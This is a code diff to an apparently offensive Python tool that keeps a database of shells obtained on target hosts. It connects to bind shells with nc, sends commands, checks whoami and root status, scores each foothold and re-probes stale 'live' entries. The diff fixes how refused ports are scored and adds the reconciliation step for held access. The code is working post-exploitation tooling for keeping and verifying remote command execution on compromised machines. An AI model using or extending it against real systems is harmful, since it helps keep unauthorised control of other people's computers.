@@ -103,15 +103,23 @@ def _run_bind_shell(handle: str, command: str, **_) -> str:
         ["nc", "-w", str(min(PROBE_TIMEOUT, 15)), host, port],
         input=f"{command}\nexit\n", capture_output=True, text=True,
         timeout=PROBE_TIMEOUT)
-    out = (proc.stdout or "") + (proc.stderr or "")
-    # A connection that never connected is NOT an answer. subprocess.run does
-    # not raise on a non-zero exit, so without this a refused or black-holed
-    # port returned "" and was recorded as a shell that replied — scoring a dead
-    # address as "answered, unknown privilege" and ranking it above nothing.
-    # Caught by CI probing 203.0.113.1 (TEST-NET) and getting ok=True.
+    # The shell's reply is STDOUT. nc writes its OWN diagnostics to STDERR —
+    # "Connection refused", "forward host lookup failed" — which are nc
+    # explaining why there is no shell, not the shell answering. Merging them
+    # counted a refused port's "Connection refused" as a non-empty reply with no
+    # uid, scoring a UDP-only / closed port 10 ("answered, unknown privilege")
+    # and ranking it ABOVE a genuinely-open silent port. Same reasoning as the
+    # ssh transport: stderr alone is not output. So the reply is stdout only.
+    out = proc.stdout or ""
+    # A connection that never connected is NOT an answer. subprocess.run does not
+    # raise on a non-zero exit, so without this a refused or black-holed port
+    # returned "" and was recorded as a shell that replied. Now that stderr is
+    # excluded, an empty stdout on a non-zero exit is exactly that case.
     if proc.returncode != 0 and not out.strip():
+        why = (proc.stderr or "").strip().splitlines()
         raise ConnectionError(
-            f"nc exited {proc.returncode} with no output from {host}:{port}")
+            f"nc exited {proc.returncode} from {host}:{port}"
+            + (f": {why[-1][:120]}" if why else " with no output"))
     return out
 
 
@@ -406,7 +414,9 @@ def refresh(target: str, *, rounds: int = None,
     try:
         with _connect() as conn:
             with conn.cursor() as cur:
+                probed = set()
                 for cand in candidates:
+                    probed.add((cand["kind"], cand["handle"]))
                     result = probe(cand, rounds=rounds)
                     cur.execute(
                         """
@@ -444,6 +454,38 @@ def refresh(target: str, *, rounds: int = None,
                         "whoami": result["whoami"], "is_root": result["is_root"],
                         "probes": f"{result['probes_ok']}/{result['probes']}",
                         "score": result["score"]})
+
+                # Reconcile what we still THINK we hold. A row that drops out of
+                # discovery (a candidate we no longer offer — e.g. a UDP port we
+                # used to mis-offer as a bind shell) would otherwise linger as a
+                # phantom "live", outranking real access, because nothing
+                # re-probes it. refresh means "re-verify everything on this
+                # target", so re-probe those too; a refused/silent one goes dead.
+                cur.execute(
+                    "SELECT kind, handle, port, transport "
+                    "  FROM public.obtained_access "
+                    " WHERE target = %s AND status = 'live'", (target,))
+                stale = [r for r in cur.fetchall() if (r[0], r[1]) not in probed]
+                for kind, handle, port, transport in stale:
+                    result = probe({"kind": kind, "handle": handle, "port": port,
+                                    "transport": transport or ""}, rounds=rounds)
+                    cur.execute(
+                        """
+                        UPDATE public.obtained_access SET
+                          whoami = %s, uid = %s, is_root = %s, os_info = %s,
+                          probes = probes + %s, probes_ok = probes_ok + %s,
+                          last_probe_at = now(), last_error = %s, score = %s,
+                          status = CASE WHEN status = 'rejected' THEN 'rejected'
+                                        ELSE %s END
+                         WHERE target = %s AND kind = %s AND handle = %s
+                        """,
+                        (result["whoami"], result["uid"], result["is_root"],
+                         result["os_info"], result["probes"], result["probes_ok"],
+                         result["last_error"], result["score"], result["status"],
+                         target, kind, handle))
+                    if result["status"] != "live":
+                        out["dead"] += 1
+                        out["reconciled_dead"] = out.get("reconciled_dead", 0) + 1
             conn.commit()
         out["available"] = True
     except Exception as e:  # noqa: BLE001
